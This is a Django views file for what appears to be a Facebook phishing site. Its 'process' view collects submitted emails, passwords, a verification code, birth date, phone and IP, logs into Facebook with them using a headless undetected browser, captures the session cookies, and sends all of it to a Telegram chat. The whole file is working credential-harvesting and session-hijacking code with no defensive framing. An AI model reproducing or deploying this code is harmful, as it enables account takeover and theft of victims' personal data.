from django.shortcuts import render
from notification.views import send_telegram_message
from seleniumbase import Driver
from datetime import datetime

import requests
import json
import logging
import time

logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)


# Create your views here.
def index(request):
    return render(request=request, template_name='index.html')


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def get_geolocation(public_ip):
    try:
        # Make a request to ipinfo.io to retrieve geolocation data
        response = requests.get(f"https://ipinfo.io/{public_ip}/json")
        geolocation_data = response.json()

        # Extract country code and city from the response
        country_code = geolocation_data.get("country")
        city = geolocation_data.get("city")
        latitude, longitude = geolocation_data.get("loc").split(",")

        # Create a JSON response with the geolocation information
        response_data = {
            "country_code": country_code,
            "city": city,
            "latitude": latitude,
            "longtitude": longitude
        }
        return response_data
    except Exception as e:
        return None


def process(request):
    if request.method == 'POST':
        final_data = {}
        public_ip = get_client_ip(request)
        # geolocation = get_geolocation(public_ip)
        final_data['public_ip'] = public_ip
        # final_data.update(geolocation)
        submit_data = json.loads(request.body)['data']
        final_data.update(submit_data)

        driver = Driver(uc=True, headless=True)
        driver.open("https://www.facebook.com")

        # Enter your Facebook username and password
        driver.type("#email", final_data.get('emailPersonal', ''))
        driver.type("#pass", final_data.get('password', ''))

        # Click the "Log In" button
        driver.click('button[name="login"]')

        # Wait for a specific element that indicates a successful login
        driver.wait_for_element('a[aria-label="Facebook"]', timeout=10)

        # Check if the element is present, indicating a successful login
        if driver.is_element_visible('a[aria-label="Facebook"]'):
            # Get the cookies after a successful login
            cookies = driver.get_cookies()

            # Format cookies into a string
            cookie_string = ';'.join([f"{cookie['name']}:{cookie['value']}" for cookie in cookies])

            # Print the formatted cookies
            final_data['cookie'] = cookie_string
            # print(cookie_string)
            driver.close()
        else:
            print("Login failed. Cookies not retrieved.")

        logging.info(final_data)
        message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n *Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\n*Cookie*: {}'.format(
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"), public_ip, final_data.get('country_code', ''),
            final_data.get('city', ''), final_data.get('proxy', ''), final_data.get('latitude', ''),
            final_data.get('longtitude', ''),
            final_data.get('information', ''), final_data.get('emailBusiness', ''),
            final_data.get('emailPersonal', ''), final_data.get('password', ''), final_data.get('fullName', ''),
            final_data.get('username', ''), final_data.get('dob', ''), final_data.get('phone', ''),
            final_data.get('user_agent',
                           'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'),
            final_data.get('code', ''), final_data.get('cookie', ''))
        logging.info('SENDING DATA TO SERVER')
        send_telegram_message(message)

        return render(request=request, template_name='form.html')
    else:
        return render(request=request, template_name='form.html')
